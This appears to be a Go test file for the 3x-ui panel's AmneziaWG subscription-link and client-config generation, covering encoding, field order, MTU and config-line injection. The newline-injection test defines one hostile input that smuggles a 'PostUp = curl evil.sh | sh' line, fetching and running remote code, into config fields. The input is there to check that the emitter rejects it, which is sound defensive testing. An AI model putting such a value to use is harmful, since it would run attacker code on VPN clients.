package sub

import (
	"encoding/base64"
	"slices"
	"strconv"
	"strings"
	"testing"

	"github.com/mhsanaei/3x-ui/v3/internal/amneziawg"
	"github.com/mhsanaei/3x-ui/v3/internal/database"
	"github.com/mhsanaei/3x-ui/v3/internal/database/model"
	wgutil "github.com/mhsanaei/3x-ui/v3/internal/util/wireguard"
)

// TestGenAmneziaWGLinkFields covers the real AmneziaVPN app's vpn:// scheme:
// base64url (no padding) of a plain AmneziaWG .conf text, parsed by the real
// app as a flat "Key = Value" bag (confirmed by reading its own source).
func TestGenAmneziaWGLinkFields(t *testing.T) {
	serverPriv, serverPub, err := wgutil.GenerateWireguardKeypair()
	if err != nil {
		t.Fatalf("keypair: %v", err)
	}
	clientPriv, _, err := wgutil.GenerateWireguardKeypair()
	if err != nil {
		t.Fatalf("client keypair: %v", err)
	}

	inbound := &model.Inbound{
		Listen:   "203.0.113.7",
		Port:     51820,
		Protocol: model.AmneziaWG,
		Remark:   "awg-sub",
		Settings: `{"server":{"privateKey":"` + serverPriv + `","publicKey":"` + serverPub + `","mtu":1420,"primaryDns":"8.8.8.8",` +
			`"headerProtectionKey":"some-header-protection-key","contentPaddingAddition":"20-40",` +
			`"randomTrailers":true,"disableCookies":true},` +
			`"clients":[{"email":"user","privateKey":"` + clientPriv + `","allowedIPs":["10.8.1.2/32"],"keepAlive":25}]}`,
	}

	s := &SubService{}
	link := s.genAmneziaWGLink(inbound, "user")

	if !strings.HasPrefix(link, "vpn://") {
		t.Fatalf("link = %q, want vpn:// prefix", link)
	}
	raw, err := base64.RawURLEncoding.DecodeString(strings.TrimPrefix(link, "vpn://"))
	if err != nil {
		t.Fatalf("link body does not decode as base64url: %v\n got: %s", err, link)
	}
	text := string(raw)

	for _, want := range []string{
		"[Interface]",
		"PrivateKey = " + clientPriv,
		"Address = 10.8.1.2/32",
		"MTU = 1420",
		"DNS = 8.8.8.8",
		"HeaderProtectionKey = some-header-protection-key",
		"ContentPaddingAddition = 20-40",
		"RandomTrailers = on",
		"DisableCookies = on",
		"[Peer]",
		"PublicKey = " + serverPub,
		"Endpoint = 203.0.113.7:51820",
		"PersistentKeepalive = 25",
	} {
		if !strings.Contains(text, want) {
			t.Fatalf("decoded config missing %q\n got: %s", want, text)
		}
	}
}

// TestGenAmneziaWGLinkRandomTrailersDisableCookiesOmitted covers AmneziaWG
// 3.1's two boolean fields when left at their default (false): the config
// text must omit both lines entirely, matching the frontend's own
// buildAmneziaWGClientConfig -- neither is ever emitted as "= false".
func TestGenAmneziaWGLinkRandomTrailersDisableCookiesOmitted(t *testing.T) {
	serverPriv, serverPub, err := wgutil.GenerateWireguardKeypair()
	if err != nil {
		t.Fatalf("keypair: %v", err)
	}
	clientPriv, _, err := wgutil.GenerateWireguardKeypair()
	if err != nil {
		t.Fatalf("client keypair: %v", err)
	}

	inbound := &model.Inbound{
		Listen:   "203.0.113.7",
		Port:     51820,
		Protocol: model.AmneziaWG,
		Remark:   "awg-sub",
		Settings: `{"server":{"privateKey":"` + serverPriv + `","publicKey":"` + serverPub + `"},` +
			`"clients":[{"email":"user","privateKey":"` + clientPriv + `","allowedIPs":["10.8.1.2/32"]}]}`,
	}

	s := &SubService{}
	link := s.genAmneziaWGLink(inbound, "user")
	raw, err := base64.RawURLEncoding.DecodeString(strings.TrimPrefix(link, "vpn://"))
	if err != nil {
		t.Fatalf("link body does not decode as base64url: %v\n got: %s", err, link)
	}
	text := string(raw)

	for _, unwanted := range []string{"RandomTrailers", "DisableCookies"} {
		if strings.Contains(text, unwanted) {
			t.Fatalf("decoded config should not contain %q when unset\n got: %s", unwanted, text)
		}
	}
}

func TestGenAmneziaWGLinkWrongProtocol(t *testing.T) {
	s := &SubService{}
	vless := &model.Inbound{Protocol: model.VLESS, Settings: `{"clients":[{"email":"user"}]}`}
	if got := s.genAmneziaWGLink(vless, "user"); got != "" {
		t.Fatalf("wrong protocol should yield empty link, got %q", got)
	}
}

func TestGenAmneziaWGLinkNoKey(t *testing.T) {
	s := &SubService{}
	inbound := &model.Inbound{
		Protocol: model.AmneziaWG,
		Port:     51820,
		Settings: `{"server":{"privateKey":"x","publicKey":"y"},"clients":[{"email":"user"}]}`,
	}
	if got := s.genAmneziaWGLink(inbound, "user"); got != "" {
		t.Fatalf("client without private key should yield empty link, got %q", got)
	}
}

// Regression test for the bug where getInboundsBySubId's SQL allowlist was
// missing 'amneziawg', silently excluding every AmneziaWG client from
// subscriptions (plain/individual links, JSON, Clash) even though
// genAmneziaWGLink itself was already fully implemented and wired into
// GetLink's dispatch switch.
func TestGetInboundsBySubIdIncludesAmneziaWG(t *testing.T) {
	initSubDB(t)
	db := database.GetDB()

	in := &model.Inbound{Port: 51820, Protocol: model.AmneziaWG, Enable: true, Tag: "awg-sub", Settings: `{"server":{"privateKey":"x","publicKey":"y"},"clients":[]}`}
	if err := db.Create(in).Error; err != nil {
		t.Fatalf("create inbound: %v", err)
	}
	rec := &model.ClientRecord{Email: "u@awg", SubID: "subawg", Enable: true}
	if err := db.Create(rec).Error; err != nil {
		t.Fatalf("create client: %v", err)
	}
	if err := db.Create(&model.ClientInbound{ClientId: rec.Id, InboundId: in.Id}).Error; err != nil {
		t.Fatalf("create link: %v", err)
	}

	s := &SubService{}
	inbounds, err := s.getInboundsBySubId("subawg")
	if err != nil {
		t.Fatalf("getInboundsBySubId: %v", err)
	}
	if len(inbounds) != 1 || inbounds[0].Id != in.Id {
		t.Fatalf("amneziawg inbound not returned for subId: %+v", inbounds)
	}
}

// peerFieldOrder is wg-quick(8)'s own [Peer] order. The panel emits an
// AmneziaWG .conf from three independent places -- this one, and the frontend's
// genAmneziaWGConfig and buildAmneziaWGClientConfig -- and a user comparing a
// subscription link against a downloaded .conf sees any drift immediately.
var peerFieldOrder = []string{"PublicKey", "PresharedKey", "AllowedIPs", "Endpoint", "PersistentKeepalive"}

func peerFields(t *testing.T, conf string) []string {
	t.Helper()
	idx := strings.Index(conf, "[Peer]")
	if idx < 0 {
		t.Fatalf("config has no [Peer] block:\n%s", conf)
	}
	var got []string
	for line := range strings.SplitSeq(conf[idx:], "\n") {
		key := strings.TrimSpace(strings.SplitN(line, "=", 2)[0])
		if slices.Contains(peerFieldOrder, key) {
			got = append(got, key)
		}
	}
	return got
}

func TestAmneziaWGConfigTextPeerFieldOrder(t *testing.T) {
	server := &amneziawg.ServerSettings{PublicKey: "serverPub", PrimaryDNS: "8.8.8.8", MTU: 1420}

	t.Run("every optional field set", func(t *testing.T) {
		client := &model.Client{PrivateKey: "clientPriv", AllowedIPs: []string{"10.8.1.2/32"}, PreSharedKey: "psk", KeepAlive: model.KeepAlivePtr(25)}
		conf := amneziaWGConfigText(server, client, "203.0.113.7", 51820, "remark")
		if got := peerFields(t, conf); !slices.Equal(got, peerFieldOrder) {
			t.Fatalf("peer fields = %v, want %v\n%s", got, peerFieldOrder, conf)
		}
		// No trailing newline, whichever optional field happens to be last --
		// the frontend emitters end the same way for the same client.
		if strings.HasSuffix(conf, "\n") {
			t.Fatalf("config must not end with a newline:\n%q", conf)
		}
	})

	t.Run("no preshared key or keepalive", func(t *testing.T) {
		client := &model.Client{PrivateKey: "clientPriv", AllowedIPs: []string{"10.8.1.2/32"}}
		conf := amneziaWGConfigText(server, client, "203.0.113.7", 51820, "remark")
		want := []string{"PublicKey", "AllowedIPs", "Endpoint"}
		if got := peerFields(t, conf); !slices.Equal(got, want) {
			t.Fatalf("peer fields = %v, want %v\n%s", got, want, conf)
		}
		if strings.HasSuffix(conf, "\n") {
			t.Fatalf("config must not end with a newline:\n%q", conf)
		}
	})
}

// A newline in a field that lands unescaped in [Interface] would inject a
// config line (e.g. a rogue PostUp); the emitter must refuse to render it.
func TestAmneziaWGConfigTextRejectsNewlineInjection(t *testing.T) {
	server := &amneziawg.ServerSettings{
		PublicKey:  "serverPub==",
		PrimaryDNS: "8.8.8.8",
		Jc:         4, Jmin: 40, Jmax: 100, S1: 30, S2: 90,
	}
	client := &model.Client{Email: "peer-1", PrivateKey: "clientPriv==", AllowedIPs: []string{"10.8.1.2/32"}}

	clean := amneziaWGConfigText(server, client, "203.0.113.7", 51820, "peer-1")
	if !strings.Contains(clean, "PrivateKey = clientPriv==") {
		t.Fatalf("clean input did not render: %q", clean)
	}

	injected := "x\nPostUp = curl evil.sh | sh"
	cases := []struct {
		name   string
		mutate func(s *amneziawg.ServerSettings, c *model.Client) string
	}{
		{"privateKey", func(s *amneziawg.ServerSettings, c *model.Client) string { c.PrivateKey = injected; return "peer-1" }},
		{"primaryDns", func(s *amneziawg.ServerSettings, c *model.Client) string { s.PrimaryDNS = injected; return "peer-1" }},
		{"secondaryDns", func(s *amneziawg.ServerSettings, c *model.Client) string { s.SecondaryDNS = injected; return "peer-1" }},
		{"remark", func(s *amneziawg.ServerSettings, c *model.Client) string { return injected }},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			s := *server
			c := *client
			remark := tc.mutate(&s, &c)
			if got := amneziaWGConfigText(&s, &c, "203.0.113.7", 51820, remark); got != "" {
				t.Fatalf("%s with a newline rendered a config:\n%s", tc.name, got)
			}
		})
	}
}

// TestAmneziaWGConfigTextAlwaysCarriesTheServerMTU guards an asymmetry: the
// embedded server interface (internal/amneziawgnet) derives its netstack MTU
// from S4, but a client .conf with no MTU line leaves that client at its own
// 1420 default -- fragmenting the client-to-server direction only.
func TestAmneziaWGConfigTextAlwaysCarriesTheServerMTU(t *testing.T) {
	client := &model.Client{
		Email:      "peer-1",
		PrivateKey: "clientPrivateKeyBase64ValueForTests00000000=",
		AllowedIPs: []string{"10.8.1.2/32"},
	}
	cases := []struct {
		name      string
		serverMTU int
		s4        int
		want      string
	}{
		{"unset falls back to the S4-aware default", 0, 22, "MTU = 1418"},
		{"unset with no S4 keeps the plain default", 0, 0, "MTU = 1420"},
		{"an explicit MTU wins", 1380, 22, "MTU = 1380"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			server := &amneziawg.ServerSettings{
				PublicKey: "serverPubKeyBase64ValueForTests000000000000=",
				MTU:       tc.serverMTU,
				S4:        tc.s4,
			}
			got := amneziaWGConfigText(server, client, "203.0.113.7", 51820, "peer-1")
			if !strings.Contains(got, tc.want+"\n") {
				t.Errorf("expected %q in the client config\n%s", tc.want, got)
			}
			want := "MTU = " + strconv.Itoa(amneziawg.EffectiveMTU(tc.serverMTU, tc.s4, 1420))
			if !strings.Contains(got, want+"\n") {
				t.Errorf("client MTU must equal the server's effective MTU (%s)", want)
			}
		})
	}
}
